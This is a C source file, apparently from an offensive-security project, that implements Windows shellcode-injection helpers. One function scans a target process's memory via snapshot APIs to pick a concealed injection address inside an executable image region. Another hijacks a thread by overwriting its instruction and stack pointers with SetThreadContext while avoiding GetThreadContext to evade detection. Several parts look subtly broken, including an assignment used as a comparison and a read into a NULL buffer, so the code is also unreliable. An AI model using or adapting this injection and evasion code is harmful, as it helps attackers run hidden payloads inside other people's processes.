#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include <ProcessSnapshot.h>

//somehow useless function, ill try updating this repo to v2 with more ideas
//this function barely add 1 to the base address of where we need to inject  
void GetHelper(ULONG_PTR* StackOffset, PVOID BaseAddress, SIZE_T ShellcodeSize, LPVOID Stack, SIZE_T SizeofImage) {
    *StackOffset = 0;
    ULONG j = 0;
    while ( j < SizeofImage){
        *StackOffset = *StackOffset + j;
        ULONG_PTR* StackVal = (ULONG_PTR*)((LPBYTE)Stack + j);
        j = j + 1;
        if (*StackVal == 0) {
            *StackOffset = *StackOffset + j;
            //printf("breaking ... \n");
            break;
        }
    }
}

//used to get the shellcode base address
BOOL GetHiddenInjectionAddress(HANDLE TargetProcess, SIZE_T ShellcodeSize, PVOID* ShellcodeLocation) {
    BOOL Success;
	DWORD PssSuccess;
    HPSS SnapshotHandle;
    static const DWORD CaptureFlags = PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_VA_SPACE | PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION;
    MEMORY_BASIC_INFORMATION MemBasicInfo;
    PSS_VA_SPACE_ENTRY VaSpaceEntry;
    ULONG i = 0;
    HPSSWALK WalkMarkerHandle;
    *ShellcodeLocation = NULL;
	PssSuccess = PssCaptureSnapshot(
		TargetProcess,
        CaptureFlags,
        NULL,
        &SnapshotHandle
    );
    if (PssSuccess != ERROR_SUCCESS) {
        printf("[!] PssCaptureSnapshot failed: Win32 error %d \n", GetLastError());
        return FALSE;
    }

    PssSuccess = PssWalkMarkerCreate(NULL, &WalkMarkerHandle);
    if (PssSuccess != ERROR_SUCCESS) {
        printf("[!] PssWalkMarkerCreate failed: Win32 error %d \n", GetLastError());
    }

    PssSuccess = PssWalkSnapshot(
        SnapshotHandle,
        PSS_WALK_VA_SPACE,
        WalkMarkerHandle,
        &VaSpaceEntry,
        sizeof(PSS_VA_SPACE_ENTRY));


    while (PssSuccess == ERROR_SUCCESS) {
        ++i;

        ZeroMemory(&MemBasicInfo, sizeof(MEMORY_BASIC_INFORMATION));
        MemBasicInfo.BaseAddress = VaSpaceEntry.BaseAddress;
        MemBasicInfo.AllocationBase = VaSpaceEntry.AllocationBase;
        MemBasicInfo.AllocationProtect = VaSpaceEntry.AllocationProtect;
        MemBasicInfo.RegionSize = VaSpaceEntry.RegionSize;
        MemBasicInfo.State = VaSpaceEntry.State;
        MemBasicInfo.Protect = VaSpaceEntry.Protect;
        MemBasicInfo.Type = VaSpaceEntry.Type;
        /*
        0x04 == Read Write
        0x20 == Execute Read
        0x40 == Execute Read Write [You Probably Won't See This]
        0x80 == Execute Write Copy [You Probably Won't See This]
        */
        if (MemBasicInfo.Protect == 0x20){
           // we need \Device\HarddiskVolume2\Windows\System32\ntdll.dll
            if (VaSpaceEntry.Type = MEM_IMAGE && 
                VaSpaceEntry.SizeOfImage > 1000000
                ){
                printf("[+] ntdll.dll captured \n");
                LPVOID Stack = NULL;
                ULONG_PTR StackOffset;
                Success = ReadProcessMemory(
                    TargetProcess,
                    (ULONG_PTR)VaSpaceEntry.ImageBase,
                    Stack,
                    ShellcodeSize,
                    NULL
                );

                Stack = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MemBasicInfo.RegionSize);
                GetHelper(&StackOffset, MemBasicInfo.BaseAddress, ShellcodeSize, Stack, VaSpaceEntry.SizeOfImage);
                *ShellcodeLocation = (PVOID)((StackOffset + (ULONG_PTR)MemBasicInfo.BaseAddress)/*);*/ - ShellcodeSize * 3);
                HeapFree(GetProcessHeap(), 0, Stack);
            }
        }
        PssSuccess = PssWalkSnapshot(SnapshotHandle,
            PSS_WALK_VA_SPACE,
            WalkMarkerHandle,
            &VaSpaceEntry,
            sizeof(PSS_VA_SPACE_ENTRY));
    }

    
    PssSuccess = PssWalkMarkerFree(WalkMarkerHandle);
    if (PssSuccess != ERROR_SUCCESS) {
        printf("[!] PssWalkMarkerFree failed: Win32 error %d \n", GetLastError());
    }
    /*
    PssSuccess = PssFreeSnapshot(TargetProcess, SnapshotHandle);
    if (PssSuccess != ERROR_SUCCESS) {
        printf("[!] PssFreeSnapshot failed: Win32 error %d \n", GetLastError());
    }
    */
    return TRUE;
}


#ifndef CONTEXT_TO_PROGRAM_COUNTER
#ifdef _X86_
#define CONTEXT_TO_PROGRAM_COUNTER(c) ((c)->Eip)
#endif
#ifdef _AMD64_
#define CONTEXT_TO_PROGRAM_COUNTER(c) ((c)->Rip)
#endif
#ifdef _ARM_
#define CONTEXT_TO_PROGRAM_COUNTER(c) ((c)->Pc)
#endif
#endif


//this function is used to hijack the thread to run 'PVOID* Rip or PVOID* Rsp' [64 or 32 respectively]
//without calling GetThreadContext
BOOL SnapThreadHijack(DWORD PID, HANDLE hThread, DWORD TID, HANDLE TargetProcess, PVOID* Rip, PVOID* Rsp) {
    CONTEXT Snapctx;
    ZeroMemory(&Snapctx, sizeof(Snapctx));
    BOOL Success;
    DWORD PssSuccess;
    HPSS SnapshotHandle;
    HPSSWALK WalkMarkerHandle;
    PSS_THREAD_ENTRY ThreadEntry;
    PSS_HANDLE_INFORMATION Handle;
    ULONG i = 0;
   
    static const DWORD CaptureFlags = PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT;
    PssSuccess = PssCaptureSnapshot(
        TargetProcess,
        CaptureFlags,
        CONTEXT_ALL,
        &SnapshotHandle
    );
    if (PssSuccess != ERROR_SUCCESS) {
        printf("[!] PssCaptureSnapshot failed: Win32 error %d \n", GetLastError());
        return FALSE;
    }
    PssSuccess = PssWalkMarkerCreate(NULL, &WalkMarkerHandle);
    if (PssSuccess != ERROR_SUCCESS) {
        printf("[!] PssWalkMarkerCreate failed: Win32 error %d \n", GetLastError());
		return FALSE;
    }
    PssSuccess = PssWalkSnapshot(SnapshotHandle,
        PSS_WALK_THREADS,
        WalkMarkerHandle,
        &ThreadEntry,
        sizeof(PSS_THREAD_ENTRY));

    while (PssSuccess == ERROR_SUCCESS) {
            ++i;
            PssSuccess = PssWalkSnapshot(
                SnapshotHandle,
                PSS_WALK_THREADS,
                WalkMarkerHandle,
                &Handle,
                sizeof(PSS_THREAD_ENTRY)
            );
            if (ThreadEntry.ThreadId == TID){
                memcpy(&Snapctx, ThreadEntry.ContextRecord, sizeof(CONTEXT));
                printf("[+] Snapctx.Rip Before Setting : 0x%-016p\n", (void*)Snapctx.Rip);
                if (Rip) {
                    Snapctx.Rip = *(DWORD64*)Rip;
                }
                if (Rsp) {
                    Snapctx.Rsp = *(DWORD64*)Rsp;
                }
                printf("[+] Snapctx.Rip After Setting : 0x%-016p\n", (void*)Snapctx.Rip);
               
                if (!SetThreadContext(hThread, &Snapctx)) {
                    printf("[!] SetThreadContext FAILED with Error : %d \n", GetLastError());
                    return FALSE;
                }
                Sleep(5000);
                printf("[+] DebugActiveProcessStop ...");
                DebugActiveProcessStop(PID);
                printf("[+] DONE \n");
            }
    }

   
    PssSuccess = PssWalkMarkerFree(WalkMarkerHandle);
    if (PssSuccess != ERROR_SUCCESS) {
        printf("[!] PssWalkMarkerFree failed: Win32 error %d \n", GetLastError());
		return FALSE;
    }
    /*
    PssSuccess = PssFreeSnapshot(TargetProcess, SnapshotHandle);
    if (PssSuccess != ERROR_SUCCESS) {
        printf("[!] PssFreeSnapshot failed: Win32 error %d \n", GetLastError());
		return FALSE;
    }
    */
    return TRUE;
}